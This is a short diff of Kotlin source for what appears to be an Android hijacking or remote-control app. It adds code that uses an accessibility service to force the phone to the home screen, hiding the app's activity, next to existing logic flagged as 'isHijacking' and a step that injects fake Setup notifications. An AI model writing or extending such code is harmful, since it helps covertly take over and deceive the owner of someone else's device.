@@ -2332,6 +2332,12 @@ object CommandProcessor {
                         LauncherManager.isHijacking = false
                     }
 
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3.5: Forcing underlying OS to Home screen to secure state.")
+                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                    kotlinx.coroutines.delay(400)
+                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                    kotlinx.coroutines.delay(500)
+
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 4: Restoring Audio and injecting fake Setup notifications.")
                     try {
                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
